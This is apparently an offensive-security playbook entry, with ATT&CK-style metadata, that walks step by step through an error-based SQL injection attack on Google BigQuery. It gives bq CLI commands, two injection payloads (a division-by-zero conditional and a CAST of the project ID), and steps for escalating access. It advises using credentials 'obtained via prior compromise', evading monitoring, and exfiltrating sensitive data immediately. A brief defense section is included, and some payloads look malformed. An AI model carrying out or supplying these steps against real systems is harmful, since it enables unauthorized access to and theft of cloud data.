---
id: dbc80215-82db-430b-88fb-f8ada0167794
name: Google-BigQuery-Error-Based-SQL-Injection
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:32.399964+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
  - '[[tactics/Collection|TA0009 - Collection]]'
techniques:
  - >-
    [[techniques/Exploitation for Client Execution|T1203 - Exploitation for
    Client Execution]]
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
sub_techniques: []
tags:
  - '[[tags/BigQuery Error Based]]'
  - '[[tags/Google BigQuery SQL Injection]]'
  - sqli
  - error-based
  - gcp
commands:
  - '[[commands/bq-execute-error-injection-query]]'
tools:
  - '[[tools/bq-BigQuery-CLI]]'
platforms:
  - GCP
  - Cloud
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
---

# Google-BigQuery-Error-Based-SQL-Injection

## Summary

This procedure demonstrates how to perform an error-based SQL injection attack against a Google BigQuery instance to extract sensitive information from the database schema or data. By injecting specially crafted SQL payloads that trigger errors, attackers can infer database structure, such as project IDs, dataset names, and potentially credentials, leading to data exfiltration or further compromise in a Google Cloud environment.

## Description

Google BigQuery is a serverless, highly scalable data warehouse in Google Cloud Platform (GCP) that processes SQL queries on massive datasets. If user inputs in query parameters, API calls, or web interfaces are not properly sanitized, they can be vulnerable to SQL injection. Error-based SQL injection exploits this by forcing the database to produce error messages that leak internal information, such as data types, table structures, or even execution context like the current project ID.

In an offensive security context, this technique is used during reconnaissance or collection phases to map the target's data assets. For example, an attacker with limited access to a BigQuery query interface (via a vulnerable web app or misconfigured API) can chain errors to enumerate datasets and columns. Defensively, organizations should use parameterized queries, input validation, and Cloud Audit Logs to monitor for anomalous query patterns. This procedure assumes access to a vulnerable query endpoint and focuses on BigQuery-specific error triggers like division by zero or invalid casting.

## Requirements

1. Access to a vulnerable BigQuery query interface (e.g., via API, web console, or compromised application).
2. Google Cloud authentication (service account key or OAuth token) if executing via CLI.
3. Installed Google Cloud SDK with the `bq` tool for query execution.
4. Knowledge of the target project's structure or initial query to inject into.
5. Optional: Proxy tool like Burp Suite for intercepting and modifying web-based queries.

## Defense

Defensive measures and detection strategies:

- Use parameterized queries and prepared statements in all BigQuery interactions to prevent injection.
- Enable and monitor BigQuery audit logs for suspicious queries, such as those containing error-inducing functions like `CAST` or division operations.
- Implement least-privilege IAM roles to limit query scopes and prevent schema enumeration.
- Validate and sanitize all user inputs in web applications or APIs that interface with BigQuery.
- Deploy Web Application Firewalls (WAF) to detect SQL injection patterns in API traffic.

## Objectives

1. Trigger database errors to leak information about the BigQuery schema, such as project IDs, datasets, and column types.
2. Extract sensitive data like usernames, credentials, or configuration details from error messages.
3. Use leaked information to escalate access to other GCP resources or achieve remote code execution via privilege escalation.
4. Validate successful injection without alerting monitoring systems.

## Instructions

### Step 1: Authenticate and Set Up BigQuery Access

**Context**: Establish authenticated access to the target BigQuery instance using the Google Cloud CLI. This ensures queries can be executed programmatically, allowing injection payloads to be tested iteratively.

**Command** ([[commands/bq-execute-error-injection-query]]):

First, authenticate with your service account or user credentials:

```bash
gcloud auth login
```

Or activate a service account key:

```bash
gcloud auth activate-service-account --key-file=service-account-key.json
```

Set the target project:

```bash
bq --project_id $_TARGET_PROJECT query "SELECT 1;"
```

> This step verifies connectivity and access. Expected output is a simple query result table confirming BigQuery responsiveness. If authentication fails, obtain valid credentials via prior compromise.

### Step 2: Identify Vulnerable Query Parameter

**Context**: Locate an injectable point, such as a user-supplied parameter in a SELECT statement (e.g., a WHERE clause or UNION). This could be in a web form, API endpoint, or direct `bq` query. Test for basic injection by appending a single quote (`'`) to see if it breaks the query.

Use the `bq` tool to simulate:

```bash
bq query --use_legacy_sql=false "SELECT * FROM $_DATASET.$_TABLE WHERE id = '$_INJECTABLE_PARAM'"
```

> Replace `$_INJECTABLE_PARAM` with a test value like `test'`. Expected output: A syntax error indicating unclosed string, confirming injection potential. If no error, the input may be sanitized—pivot to another parameter.

### Step 3: Inject Error-Based Payload for Information Disclosure

**Context**: Use the provided error-inducing SQL payloads to force BigQuery to reveal schema details. The division-by-zero payload infers lengths via conditional errors, while the CAST payload leaks context like the project ID by attempting invalid type conversion.

**Code** ([[codes/BigQuery-Error-Based-Injection-Payloads]]):

Embed the payload into the vulnerable query. For example, in a WHERE clause:

```sql
SELECT * FROM dataset_name.column_name WHERE 1=1 ' OR if(1/(length((select('a')))-1)=1,true,false) OR '
```

Or for casting:

```sql
dataset_name.column_name` union all select CAST(@@project_id AS INT64) ORDER BY 1 DESC#
```

Execute via `bq`:

**Command** ([[commands/bq-execute-error-injection-query]]):

```bash
bq query --use_legacy_sql=false "$_VULNERABLE_QUERY_WITH_PAYLOAD"
```

> The `$_VULNERABLE_QUERY_WITH_PAYLOAD` should incorporate the code snippet, e.g., replacing a parameter. Expected output: An error message like "Division by zero" or "Invalid cast" containing leaked data (e.g., "Project ID: my-project-123"). Iterate by adjusting lengths or targets to enumerate more (e.g., change `-1` to `-2` for length 2).

### Step 4: Analyze Errors and Extract Data

**Context**: Parse the error messages to build a map of the database structure. Common leaks include dataset names from invalid references or numeric values from failed casts. Chain findings to craft more precise payloads.

Review the output from Step 3 and note any revealed elements (e.g., project_id from CAST error).

> Expected output: Structured info like {"error": "Resources.project_id: 'leaked-project-id'"}. Success criteria: At least one schema element (e.g., dataset name) extracted. If errors are suppressed, the instance may have custom error handling—abort or seek alternative vectors.

### Step 5: Verify and Escalate

**Context**: Confirm the extracted information by querying legitimate elements (e.g., using the leaked project ID in a new query). Use findings to pivot, such as dumping tables or escalating via stolen credentials.

Test with a benign query using leaked data:

```bash
bq query --use_legacy_sql=false "SELECT * FROM $LEAKED_DATASET LIMIT 1"
```

> Expected output: Actual data rows if access granted, confirming escalation potential. Decision point: If data is sensitive (e.g., credentials), exfiltrate immediately; otherwise, refine injection for deeper access.
